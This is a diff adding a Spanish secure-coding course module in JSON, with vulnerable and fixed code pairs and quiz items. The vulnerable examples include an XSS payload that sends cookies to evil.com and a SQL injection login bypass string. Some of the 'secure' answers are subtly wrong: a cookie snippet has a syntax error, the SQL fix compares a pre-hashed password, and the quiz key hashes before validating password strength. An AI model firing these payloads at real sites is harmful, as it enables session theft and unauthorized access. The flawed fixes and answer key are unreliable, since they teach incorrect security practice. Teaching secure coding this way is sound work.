@@ -1,0 +1,173 @@
+{
+  "modulo": {
+    "id": 4,
+    "nombre": "Tu Código, Tu Escudo",
+    "descripcion": "Aprende a escribir código seguro: vulnerabilidades, sanitización, autenticación y defensa activa",
+    "umbralAprobacion": 70,
+    "tiempoEstimado": "15-20 minutos",
+    "icono": "💻"
+  },
+  "categorias": [
+    {
+      "id": "vulnerabilidades",
+      "nombre": "Vulnerabilidades",
+      "emoji": "🐛",
+      "descripcion": "Detectar y corregir fallas de seguridad en código",
+      "color": "rose"
+    },
+    {
+      "id": "sanitizacion",
+      "nombre": "Sanitización",
+      "emoji": "🧹",
+      "descripcion": "Limpiar y validar entradas de usuario correctamente",
+      "color": "cyan"
+    },
+    {
+      "id": "autenticacion",
+      "nombre": "Autenticación",
+      "emoji": "🔐",
+      "descripcion": "Implementar login seguro y gestión de sesiones",
+      "color": "purple"
+    },
+    {
+      "id": "defensa-activa",
+      "nombre": "Defensa Activa",
+      "emoji": "🛡️",
+      "descripcion": "Patrones defensivos para proteger aplicaciones",
+      "color": "emerald"
+    }
+  ],
+  "codeChallenges": [
+    {
+      "id": "cc-01",
+      "titulo": "XSS en Comment Box",
+      "descripcion": "Un formulario de comentarios inserta texto directamente en el DOM sin sanitizar.",
+      "codigoVulnerable": "// Renderizar comentario del usuario\nelement.innerHTML = userComment;\n\n// Ejemplo de input malicioso:\n// <script>document.location='http://evil.com?c='+document.cookie</script>",
+      "codigoSeguro": "// Sanitizar y usar textContent\nconst sanitized = DOMPurify.sanitize(userComment);\nelement.textContent = sanitized;\n\n// O usar textContent directamente:\nelement.textContent = userComment;",
+      "tipoVulnerabilidad": "Cross-Site Scripting (XSS)",
+      "pistas": [
+        "innerHTML ejecuta HTML y scripts",
+        "textContent solo inserta texto plano",
+        "DOMPurify limpia código malicioso"
+      ],
+      "puntos": 25,
+      "explicacion": "XSS ocurre cuando el código del usuario se inserta en el DOM sin sanitizar. Siempre usa textContent para texto plano o DOMPurify para HTML permitido."
+    },
+    {
+      "id": "cc-02",
+      "titulo": "SQL Injection en Login",
+      "descripcion": "Un formulario de login concatena directamente los inputs en la consulta SQL.",
+      "codigoVulnerable": "// Consulta vulnerable a SQL Injection\nconst query = `SELECT * FROM users \n  WHERE email = '${email}' \n  AND password = '${password}'`;\n\n// Input: ' OR '1'='1' --\n// Resultado: Acceso sin credenciales",
+      "codigoSeguro": "// Consulta parametrizada (segura)\nconst query = 'SELECT * FROM users WHERE email = ? AND password = ?';\nconst [user] = await db.execute(query, [email, hashedPassword]);\n\n// Nunca concatenes inputs en queries SQL",
+      "tipoVulnerabilidad": "SQL Injection",
+      "pistas": [
+        "La concatenación de strings en queries es peligrosa",
+        "Los parámetros preparados separan código de datos",
+        "Nunca confíes en la entrada del usuario"
+      ],
+      "puntos": 30,
+      "explicacion": "SQL Injection permite ejecutar queries arbitrarios. Siempre usa parámetros preparados (prepared statements) para separar la lógica SQL de los datos de entrada."
+    },
+    {
+      "id": "cc-03",
+      "titulo": "Validación de Contraseña Débil",
+      "descripcion": "Un sistema acepta contraseñas con solo 4 caracteres y sin requisitos de complejidad.",
+      "codigoVulnerable": "// Validación de contraseña insegura\nfunction validatePassword(password) {\n  return password.length >= 4;\n}\n\n// 'ab12' sería aceptada",
+      "codigoSeguro": "// Validación robusta de contraseña\nfunction validatePassword(password) {\n  const checks = [\n    password.length >= 12,\n    /[A-Z]/.test(password),\n    /[a-z]/.test(password),\n    /[0-9]/.test(password),\n    /[^A-Za-z0-9]/.test(password),\n    !/(.)\\1{2,}/.test(password),\n  ];\n  return checks.every(Boolean);\n}",
+      "tipoVulnerabilidad": "Autenticación débil",
+      "pistas": [
+        "4 caracteres es crackeable en microsegundos",
+        "Se necesitan mayúsculas, minúsculas, números y símbolos",
+        "Mínimo 12 caracteres para seguridad moderna"
+      ],
+      "puntos": 20,
+      "explicacion": "Las contraseñas débiles son la puerta de entrada más común. Un mínimo de 12 caracteres con complejidad mixta es el estándar actual."
+    },
+    {
+      "id": "cc-04",
+      "titulo": "Exposición de Secrets en Código",
+      "descripcion": "El código fuente contiene contraseñas y API keys hardcodeadas.",
+      "codigoVulnerable": "// Secrets hardcodeados (PELIGRO)\nconst API_KEY = 'sk-abc123def456ghi789';\nconst DB_PASSWORD = 'super_secret_123';\n\n// Si el código se sube a GitHub,\n// estos secrets quedan expuestos",
+      "codigoSeguro": "// Usar variables de entorno\nconst API_KEY = process.env.API_KEY;\nconst DB_PASSWORD = process.env.DB_PASSWORD;\n\n// .env (nunca en control de versiones)\n// API_KEY=sk-abc123def456ghi789\n// DB_PASSWORD=super_secret_123",
+      "tipoVulnerabilidad": "Exposición de secretos",
+      "pistas": [
+        "Nunca hardcodees secrets en el código fuente",
+        "Usa variables de entorno (.env)",
+        "Añade .env a .gitignore"
+      ],
+      "puntos": 25,
+      "explicacion": "Los secrets hardcodeados quedan expuestos en repositorios. Siempre usa variables de entorno y asegúrate de que .gitignore excluya archivos .env."
+    },
+    {
+      "id": "cc-05",
+      "titulo": "CSRF en Formulario de Email",
+      "descripcion": "Un formulario de cambio de email no valida el token CSRF, permitiendo ataques desde otros sitios.",
+      "codigoVulnerable": "// Formulario sin protección CSRF\n<form action=\"/update-email\" method=\"POST\">\n  <input name=\"newEmail\" type=\"email\" />\n  <button type=\"submit\">Actualizar</button>\n</form>\n\n// Un sitio malicioso puede enviar\n// este formulario automáticamente",
+      "codigoSeguro": "// Formulario con token CSRF\n<form action=\"/update-email\" method=\"POST\">\n  <input type=\"hidden\" \n    name=\"_csrf\" \n    value=\"{csrfToken}\" />\n  <input name=\"newEmail\" type=\"email\" />\n  <button type=\"submit\">Actualizar</button>\n</form>\n\n// El servidor valida el token CSRF",
+      "tipoVulnerabilidad": "Cross-Site Request Forgery (CSRF)",
+      "pistas": [
+        "Los formularios sin token CSRF son vulnerables",
+        "El token CSRF debe ser único por sesión",
+        "El servidor debe validar el token en cada request"
+      ],
+      "puntos": 25,
+      "explicacion": "CSRF engaña al navegador para enviar requests no autorizados. Los tokens CSRF únicos por sesión previenen estos ataques."
+    },
+    {
+      "id": "cc-06",
+      "titulo": "Almacenamiento Inseguro de Sesiones",
+      "descripcion": "Las sesiones se almacenan en localStorage sin cifrar, accesibles para scripts maliciosos.",
+      "codigoVulnerable": "// Sesión en localStorage (inseguro)\nlocalStorage.setItem('session', JSON.stringify({\n  userId: user.id,\n  role: 'admin',\n  token: authToken\n}));\n\n// Cualquier script XSS puede\n// acceder a localStorage",
+      "codigoSeguro": "// Sesión en httpOnly cookie\nres.cookie('session', token, {\n  httpOnly: true,    // No accesible vía JS\n  secure: true,      // Solo HTTPS\n  sameSite: 'strict', // Protege contra CSRF\n  maxAge: 3600000\n}));\n\n// localStorage no debe usarse\n// para datos sensibles",
+      "tipoVulnerabilidad": "Gestión de sesiones insegura",
+      "pistas": [
+        "localStorage es accesible para cualquier script",
+        "Las cookies httpOnly no son accesibles vía JavaScript",
+        "El flag 'secure' asegura solo HTTPS"
+      ],
+      "puntos": 30,
+      "explicacion": "localStorage no es seguro para sesiones porque cualquier script XSS puede leerlo. Las cookies httpOnly+secure son el estándar para manejo seguro de sesiones."
+    }
+  ],
+  "microActividades": [
+    {
+      "id": "m4-01",
+      "tipo": "verdadero-falso",
+      "pregunta": "¿Es seguro guardar contraseñas en localStorage?",
+      "respuestaCorrecta": "falso",
+      "explicacion": "localStorage no está cifrado y es accesible para cualquier script. Nunca almacenes contraseñas o tokens en localStorage.",
+      "puntos": 15
+    },
+    {
+      "id": "m4-02",
+      "tipo": "verdadero-falso",
+      "pregunta": "¿Los parámetros preparados (prepared statements) previenen SQL Injection?",
+      "respuestaCorrecta": "verdadero",
+      "explicacion": "Los prepared statements separan la lógica SQL de los datos, haciendo imposible que la entrada del usuario se interprete como código SQL.",
+      "puntos": 15
+    },
+    {
+      "id": "m4-03",
+      "tipo": "ordenar-pasos",
+      "pregunta": "Ordena los pasos para implementar autenticación segura:",
+      "respuestaCorrecta": ["Hashear contraseña con bcrypt", "Validar fortaleza de contraseña", "Almacenar solo hash (nunca texto plano)", "Implementar rate limiting", "Usar tokens de sesión seguros"],
+      "pasos": [
+        { "id": "p1", "texto": "Hashear contraseña con bcrypt", "ordenCorrecto": 0 },
+        { "id": "p2", "texto": "Validar fortaleza de contraseña", "ordenCorrecto": 1 },
+        { "id": "p3", "texto": "Almacenar solo hash (nunca texto plano)", "ordenCorrecto": 2 },
+        { "id": "p4", "texto": "Implementar rate limiting", "ordenCorrecto": 3 },
+        { "id": "p5", "texto": "Usar tokens de sesión seguros", "ordenCorrecto": 4 }
+      ],
+      "explicacion": "Primero hashea, luego valida, almacena solo el hash, protege contra fuerza bruta con rate limiting, y usa tokens seguros.",
+      "puntos": 20
+    },
+    {
+      "id": "m4-04",
+      "tipo": "verdadero-falso",
+      "pregunta": "¿innerHTML es seguro para insertar contenido del usuario?",
+      "respuestaCorrecta": "falso",
+      "explicacion": "innerHTML interpreta HTML y puede ejecutar scripts. Usa textContent para texto plano o sanitiza con DOMPurify si necesitas HTML.",
+      "puntos": 15
+    }
+  ]
+}
